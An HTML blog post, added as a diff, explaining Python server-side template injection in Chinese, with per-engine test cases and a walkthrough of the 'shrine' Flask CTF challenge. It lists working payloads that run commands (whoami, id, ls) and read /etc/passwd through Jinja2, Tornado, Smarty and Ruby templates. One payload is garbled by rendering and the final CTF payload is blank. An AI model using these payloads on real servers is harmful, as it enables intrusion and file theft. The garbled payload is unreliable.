@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>python SSTI | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    python SSTI
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python-SSTI注入"><span class="toc-number">1.</span> <span class="toc-text">python SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI是什么"><span class="toc-number">1.0.1.</span> <span class="toc-text">SSTI是什么</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="python-SSTI注入"><a href="#python-SSTI注入" class="headerlink" title="python SSTI注入"></a>python SSTI注入</h1><h3 id="SSTI是什么"><a href="#SSTI是什么" class="headerlink" title="SSTI是什么"></a>SSTI是什么</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，也给出了一个注入的概念。<br>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。sql注入已经出世很多年了，对于sql注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。<br>sql注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。<br>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。<br>现在网上提起的比较多的是Python的网站。</p>
+<p>原文链接：<a href="https://blog.csdn.net/zz_Caleb/java/article/details/96480967" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/java/article/details/96480967</a></p>
+<blockquote>
+<p>python模块注入：</p>
+<p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>
+<p><strong>测试方法：</strong></p>
+<p>1、确定使用的引擎<br>2、查看引擎相关的文档，确定其安全机制以及自带的函数和变量<br>3、需找攻击面，尝试攻击</p>
+<p><strong>测试用例</strong></p>
+<pre><code>简单的数学表达式：{{ 7+7 }} =&gt; 14
+
+字符串表达式 ：{{ "ajin" }} =&gt; ajin
+
+Ruby：
+&lt;%= 7 * 7 %&gt;
+&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt;
+
+Java：
+${7*7}
+
+Twig：
+{{7*7}}
+
+Smarty：
+{php}echo `id`;{/php}
+
+AngularJS：
+$eval(&#39;1+1&#39;)
+
+Tornado：
+引用模块 {% import module %}
+=&gt; {% import os %}{{ os.popen("whoami").read() }}
+
+Flask/Jinja2：
+{{ config.items() }}
+{{''.__class__.__mro__[-1].__subclasses__()}}
+
+Django：
+{{ request }}
+{% debug %}
+{% load module %}
+{% include "x.html" %}
+{% extends "x.html" %}</code></pre><p><strong>目标</strong></p>
+<p>创建对象<br>文件读写<br>远程文件包含<br>信息泄漏<br>提权</p>
+<p><strong>相关属性</strong><br><code>__class__</code></p>
+<pre><code>python中的新式类（即显示继承object对象的类）都有一个属性 ``__class__`` 用于获取当前实例对应的类，例如 ``&quot;&quot;.__class__`` 就可以获取到字符串实例对应的类
+
+``__mro__`` </code></pre><p>python中类对象的 <code>__mro__</code> 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</p>
+<p><code>__globals__</code></p>
+<pre><code>保存了函数所有的所有全局变量，在利用中，可以使用 ``__init__`` 获取对象的函数，并通过 ``__globals__`` 获取 ``file`` ``os`` 等模块以进行下一步的利用
+
+``__subclasses__()``</code></pre><p>python的新式类都保留了它所有的子类的引用，<strong>subclasses</strong>() 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p>
+<p>因为python中的类都是继承object的，所以只要调用object类对象的 <strong>subclasses</strong>() 方法就可以获取想要的类的对象。</p>
+<p><strong>常见Payload</strong></p>
+<p>1、<code>().__class__.__bases__[0].__subclasses__()[40](r&#39;/etc/passwd&#39;).read()</code></p>
+<p>2、`().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[59].<strong>init</strong>.func_globals.values()[13]<a href="'__import__("os"">‘eval’</a>.popen(“ls /“).read()’ )</p>
+</blockquote>
+<p>原文链接：<a href="https://blog.csdn.net/qq_37865996/java/article/details/102365374" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/java/article/details/102365374</a></p>
+<p><strong>例题：</strong></p>
+<p>攻防世界shrine</p>
+<p>此题涉及SSTI、Flask 框架、Bypass Sandbox</p>
+<p>看这里：<a href="https://www.cnblogs.com/gzs-monkey/p/10727330.html" target="_blank" rel="noopener">https://www.cnblogs.com/gzs-monkey/p/10727330.html</a></p>
+<pre><code>import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)
+
+
+@app.route(&#39;/&#39;)
+def index():
+    return open(__file__).read()
+
+    //默认访问路径为‘/’，那么会将源代码读取出来，也就是默认页面所呈现的。
+
+
+@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)
+def shrine(shrine):
+
+    def safe_jinja(s):
+        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
+        blacklist = [&#39;config&#39;, &#39;self&#39;]
+        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s
+
+    return flask.render_template_string(safe_jinja(shrine))
+//访问‘/shrine/’路径下，传入一个值，返回的是上面的这一行，输入的值首先被传到了safe_jinja函数，然后由flask.render_template_string进行渲染
+
+if __name__ == &#39;__main__&#39;:
+    app.run(debug=True)
+</code></pre><p>flask 在 /shrine/ 下的 SSTI，对 payload 进行了过滤，对小括号进行了替换，将 ( 和 ) 替换为空字符串，将 config 和 self 添加进了黑名单</p>
+<p>payload：<code>/shrine/</code></p>
+<p>参考博客：<a href="https://blog.csdn.net/mochu7777777/article/details/104868162" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/104868162</a></p>
+<p><a href="https://blog.csdn.net/qq_41429081/article/details/105487173?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_41429081/article/details/105487173?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-06-29</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
